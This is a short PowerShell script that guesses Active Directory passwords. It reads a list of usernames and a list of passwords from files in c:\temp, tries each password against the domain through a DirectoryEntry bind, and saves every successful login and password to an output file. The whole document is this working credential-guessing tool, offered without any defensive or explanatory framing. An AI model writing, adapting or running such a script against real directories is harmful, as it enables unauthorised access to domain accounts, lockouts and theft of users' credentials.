Function Test-ADAuthentication {
    param($userlogin,$userpassword)
    (new-object directoryservices.directoryentry "",$userlogin,$userpassword).psbase.name -ne $null
}
$usernames = Get-Content c:\temp\users2.txt
$saida=""
foreach($username in $usernames){
    $login = $username
    $passwords = Get-Content c:\temp\passwords.txt
    foreach($password in $passwords){

        if (Test-ADAuthentication $login $password)
        {
            #Write-Host 
            $saida += "`n Login: " + $login + "`n"
            #Write-Host 
            $saida += "`t`t Senha: " +$password 
            break
        }
    }
} 
Set-Content -Path c:\temp\saidausers.txt -Value $saida